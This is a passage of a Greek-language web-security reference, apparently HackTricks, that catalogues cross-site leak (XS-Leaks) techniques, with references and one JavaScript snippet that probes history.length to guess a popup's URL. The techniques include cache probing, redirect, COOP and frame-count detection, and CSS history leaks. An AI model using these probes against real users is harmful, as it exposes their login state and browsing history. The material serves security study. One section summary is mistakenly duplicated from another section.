Σε περίπτωση που η **κεφαλίδα Origin** ανακλάται στην κεφαλίδα `Access-Control-Allow-Origin`, ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτή τη συμπεριφορά για να προσπαθήσει να **ανακτήσει** τον **πόρο** σε **CORS** λειτουργία. Αν **δεν** προκληθεί **σφάλμα**, σημαίνει ότι ανακτήθηκε **σωστά από το διαδίκτυο**, αν προκληθεί σφάλμα, είναι επειδή **προσεγγίστηκε από την κρυφή μνήμη** (το σφάλμα εμφανίζεται επειδή η κρυφή μνήμη αποθηκεύει μια απόκριση με μια κεφαλίδα CORS που επιτρέπει τον αρχικό τομέα και όχι τον τομέα του επιτιθέμενου).\
Σημειώστε ότι αν η προέλευση δεν ανακλάται αλλά χρησιμοποιείται ένα wildcard (`Access-Control-Allow-Origin: *`), αυτό δεν θα λειτουργήσει.

## Τεχνική Αναγνωρίσιμων Ιδιοτήτων

### Fetch Redirect

- **Μέθοδοι Συμπερίληψης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Status Code
- **Περισσότερες πληροφορίες**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Περίληψη:** GC και SA επιτρέπουν να ελέγξετε τον τύπο της απόκρισης (opaque-redirect) αφού ολοκληρωθεί η ανακατεύθυνση.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Υποβάλλοντας ένα αίτημα χρησιμοποιώντας το Fetch API με `redirect: "manual"` και άλλες παραμέτρους, είναι δυνατόν να διαβάσετε την ιδιότητα `response.type` και αν είναι ίση με `opaqueredirect`, τότε η απόκριση ήταν μια ανακατεύθυνση.

### COOP

- **Μέθοδοι Συμπερίληψης**: Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Περίληψη:** Σελίδες που προστατεύονται από την Πολιτική Ανοίγματος Διασυνοριακής Προέλευσης (COOP) αποτρέπουν την πρόσβαση από διασυνοριακές αλληλεπιδράσεις.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Ένας επιτιθέμενος είναι ικανός να deduce την παρουσία της κεφαλίδας Πολιτικής Ανοίγματος Διασυνοριακής Προέλευσης (COOP) σε μια διασυνοριακή HTTP απόκριση. Η COOP χρησιμοποιείται από διαδικτυακές εφαρμογές για να εμποδίσει εξωτερικούς ιστότοπους να αποκτούν αυθαίρετες αναφορές παραθύρων. Η ορατότητα αυτής της κεφαλίδας μπορεί να διακριθεί προσπαθώντας να αποκτήσετε την αναφορά **`contentWindow`**. Σε σενάρια όπου η COOP εφαρμόζεται υπό προϋποθέσεις, η **ιδιότητα `opener`** γίνεται ένας προειδοποιητικός δείκτης: είναι **undefined** όταν η COOP είναι ενεργή και **ορισμένη** στην απουσία της.

### URL Max Length - Server Side

- **Μέθοδοι Συμπερίληψης**: Fetch API, HTML Elements
- **Ανιχνεύσιμη Διαφορά**: Status Code / Περιεχόμενο
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Περίληψη:** Ανιχνεύστε διαφορές στις αποκρίσεις επειδή το μήκος της απόκρισης ανακατεύθυνσης μπορεί να είναι πολύ μεγάλο ώστε ο διακομιστής να απαντήσει με σφάλμα και να δημιουργηθεί μια ειδοποίηση.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Αν μια ανακατεύθυνση από τον διακομιστή χρησιμοποιεί **είσοδο χρήστη μέσα στην ανακατεύθυνση** και **επιπλέον δεδομένα**. Είναι δυνατόν να ανιχνευθεί αυτή η συμπεριφορά επειδή συνήθως οι **διακομιστές** έχουν ένα **όριο μήκους αιτήματος**. Αν τα **δεδομένα χρήστη** είναι **αυτό το μήκος - 1**, επειδή η **ανακατεύθυνση** χρησιμοποιεί **αυτά τα δεδομένα** και **προσθέτει** κάτι **επιπλέον**, θα προκαλέσει ένα **σφάλμα ανιχνεύσιμο μέσω των Σφαλμάτων**.

Αν μπορείτε με κάποιο τρόπο να ορίσετε cookies σε έναν χρήστη, μπορείτε επίσης να εκτελέσετε αυτή την επίθεση **ορίζοντας αρκετά cookies** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) έτσι ώστε με το **αυξημένο μέγεθος απόκρισης** της **σωστής απόκρισης** να προκληθεί ένα **σφάλμα**. Σε αυτή την περίπτωση, θυμηθείτε ότι αν προκαλέσετε αυτό το αίτημα από τον ίδιο ιστότοπο, το `<script>` θα στείλει αυτόματα τα cookies (έτσι μπορείτε να ελέγξετε για σφάλματα).\
Ένα παράδειγμα του **cookie bomb + XS-Search** μπορεί να βρεθεί στη Σκοπούμενη λύση αυτής της αναφοράς: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ή να είναι στο ίδιο πλαίσιο είναι συνήθως απαραίτητο για αυτόν τον τύπο επίθεσης.

### URL Max Length - Client Side

- **Μέθοδοι Συμπερίληψης**: Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Status Code / Περιεχόμενο
- **Περισσότερες πληροφορίες**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Περίληψη:** Ανιχνεύστε διαφορές στις αποκρίσεις επειδή το μήκος της απόκρισης ανακατεύθυνσης μπορεί να είναι πολύ μεγάλο για ένα αίτημα ώστε να παρατηρηθεί μια διαφορά.
- **Παράδειγμα Κώδικα**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Σύμφωνα με [την τεκμηρίωση του Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length), το μέγιστο μήκος URL του Chrome είναι 2MB.

> Γενικά, η _πλατφόρμα ιστού_ δεν έχει όρια στο μήκος των URLs (αν και το 2^31 είναι ένα κοινό όριο). _Ο Chrome_ περιορίζει τα URLs σε μέγιστο μήκος **2MB** για πρακτικούς λόγους και για να αποφευχθούν προβλήματα άρνησης υπηρεσίας στην επικοινωνία μεταξύ διαδικασιών.

Επομένως, αν η **ανακατεύθυνση URL** που απάντησε είναι μεγαλύτερη σε μία από τις περιπτώσεις, είναι δυνατόν να την ανακατευθύνετε με ένα **URL μεγαλύτερο από 2MB** για να χτυπήσετε το **όριο μήκους**. Όταν συμβαίνει αυτό, ο Chrome εμφανίζει μια σελίδα **`about:blank#blocked`**.

Η **ανιχνεύσιμη διαφορά** είναι ότι αν η **ανακατεύθυνση** ολοκληρώθηκε, το `window.origin` προκαλεί ένα **σφάλμα** επειδή μια διασυνοριακή προέλευση δεν μπορεί να έχει πρόσβαση σε αυτές τις πληροφορίες. Ωστόσο, αν το **όριο** χτυπήθηκε και η φορτωμένη σελίδα ήταν **`about:blank#blocked`**, η **`origin`** του παραθύρου παραμένει αυτή του **γονέα**, η οποία είναι μια **προσβάσιμη πληροφορία**.

Όλες οι επιπλέον πληροφορίες που χρειάζονται για να φτάσετε τα **2MB** μπορούν να προστεθούν μέσω ενός **hash** στο αρχικό URL ώστε να χρησιμοποιηθεί στην **ανακατεύθυνση**.

{{#ref}}
xs-search/url-max-length-client-side.md
{{#endref}}

### Max Redirects

- **Μέθοδοι Συμπερίληψης**: Fetch API, Frames
- **Ανιχνεύσιμη Διαφορά**: Status Code
- **Περισσότερες πληροφορίες**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Περίληψη:** Χρησιμοποιήστε το όριο ανακατεύθυνσης του περιηγητή για να προσδιορίσετε την εμφάνιση ανακατευθύνσεων URL.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Αν ο **μέγιστος** αριθμός **ανακατευθύνσεων** που μπορεί να ακολουθήσει ένας περιηγητής είναι **20**, ένας επιτιθέμενος θα μπορούσε να προσπαθήσει να φορτώσει τη σελίδα του με **19 ανακατευθύνσεις** και τελικά **να στείλει το θύμα** στη δοκιμασμένη σελίδα. Αν προκληθεί **σφάλμα**, τότε η σελίδα προσπαθούσε να **ανακατευθύνει το θύμα**.

### History Length

- **Μέθοδοι Συμπερίληψης**: Frames, Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Ανακατευθύνσεις
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Περίληψη:** Ο κώδικας JavaScript χειρίζεται την ιστορία του περιηγητή και μπορεί να προσπελαστεί μέσω της ιδιότητας μήκους.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Η **API Ιστορίας** επιτρέπει στον κώδικα JavaScript να χειρίζεται την ιστορία του περιηγητή, η οποία **αποθηκεύει τις σελίδες που επισκέπτεται ένας χρήστης**. Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει την ιδιότητα μήκους ως μέθοδο συμπερίληψης: για να ανιχνεύσει την πλοήγηση JavaScript και HTML.\
**Ελέγχοντας το `history.length`**, κάνοντας έναν χρήστη **να πλοηγηθεί** σε μια σελίδα, **αλλάζοντας** την **πίσω** στην ίδια προέλευση και **ελέγχοντας** τη νέα τιμή του **`history.length`**.

### History Length with same URL

- **Μέθοδοι Συμπερίληψης**: Frames, Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Αν το URL είναι το ίδιο με αυτό που μαντεύτηκε
- **Περίληψη:** Είναι δυνατόν να μαντέψετε αν η τοποθεσία ενός frame/pop-up είναι σε μια συγκεκριμένη URL εκμεταλλευόμενοι το μήκος της ιστορίας.
- **Παράδειγμα Κώδικα**: Παρακάτω

Ένας επιτιθέμενος θα μπορούσε να χρησιμοποιήσει κώδικα JavaScript για να **χειριστεί την τοποθεσία του frame/pop-up σε μια μαντεμένη** και **άμεσα** **να την αλλάξει σε `about:blank`**. Αν το μήκος της ιστορίας αυξήθηκε, σημαίνει ότι το URL ήταν σωστό και είχε χρόνο να **αυξηθεί επειδή το URL δεν επαναφορτώνεται αν είναι το ίδιο**. Αν δεν αυξήθηκε, σημαίνει ότι **προσπάθησε να φορτώσει το μαντεμένο URL** αλλά επειδή **άμεσα μετά** φορτώθηκε **`about:blank`**, το **μήκος της ιστορίας δεν αυξήθηκε ποτέ** κατά τη φόρτωση του μαντεμένου URL.
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Frame Counting

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Summary:** Αξιολογήστε την ποσότητα των στοιχείων iframe ελέγχοντας την ιδιότητα `window.length`.
- **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Η μέτρηση του **αριθμού των πλαισίων σε μια ιστοσελίδα** που ανοίγεται μέσω `iframe` ή `window.open` μπορεί να βοηθήσει στην αναγνώριση της **κατάστασης του χρήστη σε αυτή τη σελίδα**.\
Επιπλέον, αν η σελίδα έχει πάντα τον ίδιο αριθμό πλαισίων, η **συνεχής** παρακολούθηση του αριθμού των πλαισίων μπορεί να βοηθήσει στην αναγνώριση ενός **μοτίβου** που μπορεί να διαρρεύσει πληροφορίες.

Ένα παράδειγμα αυτής της τεχνικής είναι ότι στο Chrome, ένα **PDF** μπορεί να **ανιχνευθεί** με **μέτρηση πλαισίων** επειδή χρησιμοποιείται ένα `embed` εσωτερικά. Υπάρχουν [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) που επιτρέπουν κάποιον έλεγχο πάνω στο περιεχόμενο όπως `zoom`, `view`, `page`, `toolbar` όπου αυτή η τεχνική θα μπορούσε να είναι ενδιαφέρουσα.

### HTMLElements

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Summary:** Διαβάστε την διαρρεύσουσα τιμή για να διακρίνετε μεταξύ 2 πιθανών καταστάσεων
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Η διαρροή πληροφοριών μέσω HTML στοιχείων είναι ανησυχητική στην ασφάλεια του διαδικτύου, ιδιαίτερα όταν δυναμικά αρχεία πολυμέσων δημιουργούνται με βάση τις πληροφορίες του χρήστη, ή όταν προστίθενται υδατογραφήματα, αλλάζοντας το μέγεθος των πολυμέσων. Αυτό μπορεί να εκμεταλλευτεί από επιτιθέμενους για να διακρίνουν μεταξύ πιθανών καταστάσεων αναλύοντας τις πληροφορίες που εκτίθενται από ορισμένα HTML στοιχεία.

### Information Exposed by HTML Elements

- **HTMLMediaElement**: Αυτό το στοιχείο αποκαλύπτει την `duration` και τους `buffered` χρόνους του μέσου, οι οποίοι μπορούν να προσπελαστούν μέσω του API του. [Read more about HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Αποκαλύπτει το `videoHeight` και το `videoWidth`. Σε ορισμένους περιηγητές, είναι διαθέσιμες επιπλέον ιδιότητες όπως `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, και `webkitDecodedFrameCount`, προσφέροντας περισσότερες λεπτομέρειες σχετικά με το περιεχόμενο των πολυμέσων. [Read more about HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Αυτή η συνάρτηση παρέχει λεπτομέρειες σχετικά με την ποιότητα αναπαραγωγής βίντεο, συμπεριλαμβανομένων των `totalVideoFrames`, που μπορεί να υποδεικνύει την ποσότητα των δεδομένων βίντεο που έχουν επεξεργαστεί. [Read more about getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Αυτό το στοιχείο διαρρέει το `height` και το `width` μιας εικόνας. Ωστόσο, αν μια εικόνα είναι μη έγκυρη, αυτές οι ιδιότητες θα επιστρέψουν 0, και η συνάρτηση `image.decode()` θα απορριφθεί, υποδεικνύοντας την αποτυχία φόρτωσης της εικόνας σωστά. [Read more about HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Summary:** Εντοπίστε τις παραλλαγές στο στυλ της ιστοσελίδας που σχετίζονται με την κατάσταση ή το καθεστώς του χρήστη.
- **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Οι διαδικτυακές εφαρμογές μπορεί να αλλάξουν το **στυλ της ιστοσελίδας ανάλογα με την κατάσταση του χρήστη**. Τα CSS αρχεία διασυνοριακής προέλευσης μπορούν να ενσωματωθούν στη σελίδα του επιτιθέμενου με το **HTML link element**, και οι **κανόνες** θα **εφαρμοστούν** στη σελίδα του επιτιθέμενου. Αν μια σελίδα αλλάζει δυναμικά αυτούς τους κανόνες, ένας επιτιθέμενος μπορεί να **ανιχνεύσει** αυτές τις **διαφορές** ανάλογα με την κατάσταση του χρήστη.\
Ως τεχνική διαρροής, ο επιτιθέμενος μπορεί να χρησιμοποιήσει τη μέθοδο `window.getComputedStyle` για να **διαβάσει τις CSS** ιδιότητες ενός συγκεκριμένου HTML στοιχείου. Ως αποτέλεσμα, ένας επιτιθέμενος μπορεί να διαβάσει αυθαίρετες CSS ιδιότητες αν είναι γνωστό το επηρεαζόμενο στοιχείο και το όνομα της ιδιότητας.

### CSS History

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Summary:** Ανιχνεύστε αν το στυλ `:visited` εφαρμόζεται σε μια διεύθυνση URL που υποδεικνύει ότι έχει ήδη επισκεφθεί
- **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!NOTE]
> Σύμφωνα με [**αυτό**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), αυτό δεν λειτουργεί στο headless Chrome.

Ο CSS `:visited` επιλεγέας χρησιμοποιείται για να στυλιζάρει τις διευθύνσεις URL διαφορετικά αν έχουν επισκεφθεί προηγουμένως από τον χρήστη. Στο παρελθόν, η μέθοδος `getComputedStyle()` μπορούσε να χρησιμοποιηθεί για να εντοπίσει αυτές τις διαφορές στυλ. Ωστόσο, οι σύγχρονοι περιηγητές έχουν εφαρμόσει μέτρα ασφαλείας για να αποτρέψουν αυτή τη μέθοδο από το να αποκαλύψει την κατάσταση ενός συνδέσμου. Αυτά τα μέτρα περιλαμβάνουν την επιστροφή του υπολογισμένου στυλ ως αν ο σύνδεσμος είχε επισκεφθεί και περιορίζοντας τα στυλ που μπορούν να εφαρμοστούν με τον επιλεγέα `:visited`.

Παρά αυτούς τους περιορισμούς, είναι δυνατόν να διακριθεί η επισκεφθείσα κατάσταση ενός συνδέσμου έμμεσα. Μια τεχνική περιλαμβάνει την εξαπάτηση του χρήστη να αλληλεπιδράσει με μια περιοχή που επηρεάζεται από το CSS, χρησιμοποιώντας συγκεκριμένα την ιδιότητα `mix-blend-mode`. Αυτή η ιδιότητα επιτρέπει την ανάμειξη στοιχείων με το φόντο τους, αποκαλύπτοντας ενδεχομένως την επισκεφθείσα κατάσταση με βάση την αλληλεπίδραση του χρήστη.

Επιπλέον, η ανίχνευση μπορεί να επιτευχθεί χωρίς αλληλεπίδραση του χρήστη εκμεταλλευόμενη τους χρόνους απόδοσης των συνδέσμων. Δεδομένου ότι οι περιηγητές μπορεί να αποδώσουν τους επισκεφθέντες και μη επισκεφθέντες συνδέσμους διαφορετικά, αυτό μπορεί να εισάγει μια μετρήσιμη χρονική διαφορά στην απόδοση. Ένα αποδεικτικό της έννοιας (PoC) αναφέρθηκε σε μια αναφορά σφάλματος του Chromium, που αποδεικνύει αυτή την τεχνική χρησιμοποιώντας πολλούς συνδέσμους για να ενισχύσει τη χρονική διαφορά, καθιστώντας έτσι την επισκεφθείσα κατάσταση ανιχνεύσιμη μέσω ανάλυσης χρόνου.

Για περισσότερες λεπτομέρειες σχετικά με αυτές τις ιδιότητες και μεθόδους, επισκεφθείτε τις σελίδες τεκμηρίωσης τους:

- `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Headers
- **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Summary:** Στο Google Chrome, εμφανίζεται μια ειδική σελίδα σφάλματος όταν μια σελίδα αποκλείεται από το να ενσωματωθεί σε μια διασυνοριακή τοποθεσία λόγω περιορισμών X-Frame-Options.
- **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Στο Chrome, αν μια σελίδα με την κεφαλίδα `X-Frame-Options` ρυθμισμένη σε "deny" ή "same-origin" ενσωματωθεί ως αντικείμενο, εμφανίζεται μια σελίδα σφάλματος. Ο Chrome επιστρέφει μοναδικά ένα κενό αντικείμενο εγγράφου (αντί για `null`) για την ιδιότητα `contentDocument` αυτού του αντικειμένου, σε αντίθεση με τα iframes ή άλλους περιηγητές. Οι επιτιθέμενοι θα μπορούσαν να εκμεταλλευτούν αυτό ανιχνεύοντας το κενό έγγραφο, αποκαλύπτοντας ενδεχομένως πληροφορίες σχετικά με την κατάσταση του χρήστη, ειδικά αν οι προγραμματιστές ρυθμίζουν ασυνεπώς την κεφαλίδα X-Frame-Options, συχνά παραβλέποντας τις σελίδες σφάλματος. Η ευαισθητοποίηση και η συνεπής εφαρμογή των κεφαλίδων ασφαλείας είναι κρίσιμες για την αποτροπή τέτοιων διαρροών.

### Download Detection

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Headers
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Summary:** Ένας επιτιθέμενος μπορεί να διακρίνει τις λήψεις αρχείων εκμεταλλευόμενος τα iframes; η συνεχής προσβασιμότητα του iframe υποδηλώνει επιτυχημένη λήψη αρχείου.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Η κεφαλίδα `Content-Disposition`, συγκεκριμένα `Content-Disposition: attachment`, δίνει εντολή στον περιηγητή να κατεβάσει το περιεχόμενο αντί να το εμφανίσει ενσωματωμένο. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί για να ανιχνεύσει αν ένας χρήστης έχει πρόσβαση σε μια σελίδα που προκαλεί λήψη αρχείου. Σε περιηγητές που βασίζονται στο Chromium, υπάρχουν μερικές τεχνικές για να ανιχνευθεί αυτή η συμπεριφορά λήψης:

1. **Παρακολούθηση Λωρίδας Λήψης**:
- Όταν ένα αρχείο κατεβαίνει σε περιηγητές που βασίζονται στο Chromium, μια λωρίδα λήψης εμφανίζεται στο κάτω μέρος του παραθύρου του περιηγητή.
- Παρακολουθώντας τις αλλαγές στο ύψος του παραθύρου, οι επιτιθέμενοι μπορούν να συμπεράνουν την εμφάνιση της λωρίδας λήψης, υποδεικνύοντας ότι έχει ξεκινήσει μια λήψη.
2. **Λήψη Πλοήγησης με Iframes**:
- Όταν μια σελίδα προκαλεί λήψη αρχείου χρησιμοποιώντας την κεφαλίδα `Content-Disposition: attachment`, δεν προκαλεί ένα γεγονός πλοήγησης.
- Φορτώνοντας το περιεχόμενο σε ένα iframe και παρακολουθώντας τα γεγονότα πλοήγησης, είναι δυνατόν να ελέγξετε αν η διάταξη περιεχομένου προκαλεί λήψη αρχείου (χωρίς πλοήγηση) ή όχι.
3. **Λήψη Πλοήγησης χωρίς Iframes**:
- Παρόμοια με την τεχνική iframe, αυτή η μέθοδος περιλαμβάνει τη χρήση του `window.open` αντί για ένα iframe.
- Η παρακολούθηση των γεγονότων πλοήγησης στο νέο ανοιγμένο παράθυρο μπορεί να αποκαλύψει αν προκλήθηκε λήψη αρχείου (χωρίς πλοήγηση) ή αν το περιεχόμενο εμφανίζεται ενσωματωμένο (πλοήγηση συμβαίνει).

Σε σενάρια όπου μόνο οι συνδεδεμένοι χρήστες μπορούν να προκαλέσουν τέτοιες λήψεις, αυτές οι τεχνικές μπορούν να χρησιμοποιηθούν για να υποδείξουν έμμεσα την κατάσταση αυθεντικοποίησης του χρήστη με βάση την αντίδραση του περιηγητή στο αίτημα λήψης.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Summary:** Ένας επιτιθέμενος μπορεί να διακρίνει τις λήψεις αρχείων εκμεταλλευόμενος τα iframes; η συνεχής προσβασιμότητα του iframe υποδηλώνει επιτυχημένη λήψη αρχείου.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> Αυτός είναι ο λόγος που αυτή η τεχνική είναι ενδιαφέρουσα: Το Chrome έχει τώρα **κατανομή cache**, και το κλειδί cache της νέας ανοιγμένης σελίδας είναι: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, αλλά αν ανοίξω μια σελίδα ngrok και χρησιμοποιήσω fetch σε αυτήν, το κλειδί cache θα είναι: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, το **κλειδί cache είναι διαφορετικό**, οπότε η cache δεν μπορεί να μοιραστεί. Μπορείτε να βρείτε περισσότερες λεπτομέρειες εδώ: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
> (Σχόλιο από [**εδώ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

Αν μια τοποθεσία `example.com` περιλαμβάνει έναν πόρο από `*.example.com/resource`, τότε αυτός ο πόρος θα έχει το **ίδιο κλειδί cache** όπως αν ο πόρος ζητούνταν απευθείας **μέσω πλοήγησης κορυφαίου επιπέδου**. Αυτό συμβαίνει επειδή το κλειδί cache αποτελείται από το κορυφαίο _eTLD+1_ και το frame _eTLD+1_.

Δεδομένου ότι η πρόσβαση στην cache είναι ταχύτερη από τη φόρτωση ενός πόρου, είναι δυνατόν να προσπαθήσετε να αλλάξετε τη θέση μιας σελίδας και να την ακυρώσετε 20ms (για παράδειγμα) αργότερα. Αν η προέλευση άλλαξε μετά την διακοπή, σημαίνει ότι ο πόρος είχε αποθηκευτεί στην cache.\
Ή θα μπορούσατε απλώς να **στείλετε κάποιο fetch στη δυνητικά αποθηκευμένη σελίδα και να μετρήσετε τον χρόνο που χρειάζεται**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Redirects
- **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Summary:** Είναι δυνατόν να ανακαλύψετε αν μια απάντηση σε ένα αίτημα fetch είναι ανακατεύθυνση
- **Code Example**:

![](<../images/image (652).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Summary:** Είναι δυνατόν να προσπαθήσετε να φορτώσετε έναν πόρο και πριν φορτωθεί να διακοπεί η φόρτωση. Ανάλογα με το αν προκληθεί σφάλμα, ο πόρος είχε ή δεν είχε αποθηκευτεί στην cache.
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

